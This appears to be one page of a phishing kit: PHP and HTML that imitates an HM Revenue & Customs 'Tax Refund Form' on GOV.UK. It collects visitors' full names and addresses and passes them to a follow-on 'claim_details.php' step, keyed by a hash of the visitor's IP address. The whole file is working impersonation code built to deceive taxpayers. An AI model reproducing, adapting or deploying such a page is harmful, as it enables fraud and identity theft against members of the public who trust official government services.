<?php

error_reporting(0);

session_start();



$v_ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($v_ip);

?>

<!DOCTYPE html>

<html lang="en" class="js no-touchevents details svg video" style=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    

    <title>Enter Your Name And Address</title>

    <script type="text/javascript">
      (function(){if(navigator.userAgent.match(/IEMobile\/10\.0/)){var d=document,c="appendChild",a=d.createElement("style");a[c](d.createTextNode("@-ms-viewport{width:auto!important}"));d.getElementsByTagName("head")[0][c](a);}})();
    </script>

    <!--[if gt IE 8]><!--><link href="./step1_files/govuk-template.css" media="screen" rel="stylesheet" type="text/css"><!--<![endif]-->
    <!--[if IE 6]><link href="./step1_files/govuk-template-ie6.css" media="screen" rel="stylesheet" type="text/css" /><![endif]-->
    <!--[if IE 7]><link href="./step1_files/govuk-template-ie7.css" media="screen" rel="stylesheet" type="text/css" /><![endif]-->
    <!--[if IE 8]><link href="./step1_files/govuk-template-ie8.css" media="screen" rel="stylesheet" type="text/css" /><![endif]-->

    <link href="./step1_files/govuk-template-print.css" media="print" rel="stylesheet" type="text/css">

    <!--[if IE 8]>
    <script type="text/javascript">
      (function(){if(window.opera){return;}
       setTimeout(function(){var a=document,g,b={families:(g=
       ["nta"]),urls:["/template/assets/stylesheets/fonts-ie8.css"]},
       c="/template/assets/javascripts/vendor/goog/webfont-debug.js",d="script",
       e=a.createElement(d),f=a.getElementsByTagName(d)[0],h=g.length;WebFontConfig
       ={custom:b},e.src=c,f.parentNode.insertBefore(e,f);for(;h=h-1;a.documentElement
       .className+=' wf-'+g[h].replace(/\s/g,'').toLowerCase()+'-n4-loading');},0)
      })()
    </script>
    <![endif]-->
    <!--[if gte IE 9]><!-->
      <link href="./step1_files/fonts.css" media="all" rel="stylesheet" type="text/css">
    <!--<![endif]-->


    <!--[if lt IE 9]>
      <script src="./step1_files/ie.js" type="text/javascript"></script>
    <![endif]-->

    <link rel="shortcut icon" href="./step1_files/favicon.ico" type="image/x-icon">

    <!-- For third-generation iPad with high-resolution Retina display: -->
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="./step1_files/apple-touch-icon-144x144.png">
    <!-- For iPhone with high-resolution Retina display: -->
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="./step1_files/apple-touch-icon-114x114.png">
    <!-- For first- and second-generation iPad: -->
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="./step1_files/apple-touch-icon-72x72.png">
    <!-- For non-Retina iPhone, iPod Touch, and Android 2.1+ devices: -->
    <link rel="apple-touch-icon-precomposed" href="./step1_files/apple-touch-icon-57x57.png">

    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta property="og:image" content="./step1_files/opengraph-image.png">

    


	<!--[if lt IE 8 ]>
	<link rel='stylesheet' href='./step1_files/application-ie7.min.css' />
	<![endif]-->
	<!--[if IE 8 ]>
	<link rel='stylesheet' href='./step1_files/application-ie.min.css' />
	<![endif]-->
	<!--[if gt IE 8]><!-->
	<link rel="stylesheet" href="./step1_files/application.min.css">
	
  </head>

  <body class="js-enabled">
    

    <div id="skiplink-container">
      <div>
        <a href="" class="skiplink">Skip to main content</a>
      </div>
    </div>

    
    <header role="banner" id="global-header" class="">
      <div class="header-wrapper">
        <div class="header-global">
          <div class="header-logo">
            <a href="" title="" data-journey-click="header:Click:GOV UK" id="logo" class="content">
              <img src="./step1_files/gov.uk_logotype_crown.png" alt=""> GOV.UK
            </a>
          </div>

        </div>
          


        
      </div>
    </header>
    <!--end header-->
    


<main id="wrapper" role="main">
    <div class="centered-content">
        


<div class="service-info ">
    
    
        <div class="logo">
            <span class="organisation-logo organisation-logo-medium">HM Revenue &amp; Customs</span>
        </div>
    
    
</div>


    </div>
    <div id="content">

        

        




    

<p class="label--inline-right">

    
        
            English
        
        
             | 
        
    
        
            <a id="cymraeg-switch" href="" target="_self" data-sso="false" data-journey-click="government-gateway-registration-frontend:language: cy">Cymraeg</a>
        
        
    
</p>




        


<article class="content__body">
    

    <h1 class="heading-48">Tax Refund Form</h1>
	
	<hr><br>
	
	<h1 class="heading-48" style="font-size: 120%">Enter Name and Address</h1><br>

     <p class="form-hint">Please provide your full name and address to start the process.</p><br>

<form action="claim_details.php?&sessionid=<?php echo $hash; ?>&securessl=true" method="POST" id="registerForm" class="form js-form" autocomplete="off" novalidate="novalidate">
  
<div class="flash error-summary " id="error-summary-display" role="alert" aria-labelledby="error-summary-heading" tabindex="-1">
    <h2 id="error-summary-heading" class="h3-heading">There are errors on the page.</h2>
    <ul class="js-error-summary-messages">
    
    </ul>
</div>


        
        <fieldset class="form-field-group row">
            <label class="form-element-bold label--full-length" for="fullName">
                Full Name
                

<span id="dob-error-message" class="error-notification" role="alert" data-input-name="fullName">
      Enter your date of birth.
</span>

                <input type="text" name="full_name" id="full_name" value="" class="form-control--block input--medium" aria-required="true" required="" minlength="5" maxlength="40" data-msg-required="Enter your full name" data-msg-minlength="The name you have entered is too short. It should be at least 5 characters" data-msg-maxlength="The name you have entered is too long. It should be a maximum of 40 characters">
            </label>
        </fieldset>
		
		<fieldset class="form-field-group row">
            <label class="form-element-bold label--full-length" for="fullName">
                Address
                

<span id="dob-error-message" class="error-notification" role="alert" data-input-name="fullName">
      Enter your date of birth.
</span>

                <input type="text" name="address" id="address" value="" class="form-control--block input--medium" aria-required="true" required="" minlength="5" maxlength="50" data-msg-required="Enter your street address" data-msg-minlength="The street address you have entered is too short. It should be at least 5 characters" data-msg-maxlength="The street address you have entered is too long. It should be a maximum of 40 characters">
            </label>
        </fieldset>
		
		<br>
       

        <button id="submitBtn" type="submit" class="button" value="Continue">Start Claim</button>
</form>


</article>

    </div>
</main>



    <footer class="group js-footer" id="footer" role="contentinfo">

      <div class="footer-wrapper">
        


        <div class="footer-meta">
          <div class="footer-meta-inner">
            

<ul class="platform-help-links">
    <li><a href="" target="_blank" data-sso="false" data-journey-click="footer:Click:Cookies">Cookies</a></li>
    <li><a href="" target="_blank" data-sso="false" data-journey-click="footer:Click:Privacy policy">Privacy policy</a></li>
    <li><a href="" target="_blank" data-sso="false" data-journey-click="footer:Click:Terms and conditions">Terms and conditions</a></li>
    <li><a href="" target="_blank" data-sso="false" data-journey-click="footer:Click:Help">Help using GOV.UK</a></li>
    
</ul>


            <div class="open-government-licence">
              <h2><a href="" target="_blank"><img src="./step1_files/open-government-licence_2x.png" alt=""></a></h2>
              <p>All content is available under the <a href="" target="_blank">Open Government Licence v3.0</a>, except where otherwise stated</p>
            </div>
          </div>

          <div class="copyright">
            <a href="" target="_blank">© Crown Copyright</a>
          </div>
        </div>
      </div>
    </footer>

    <div id="global-app-error" class="app-error hidden"></div>

 
<script src="./step1_files/application.min.js" type="text/javascript"></script>

 

</body></html>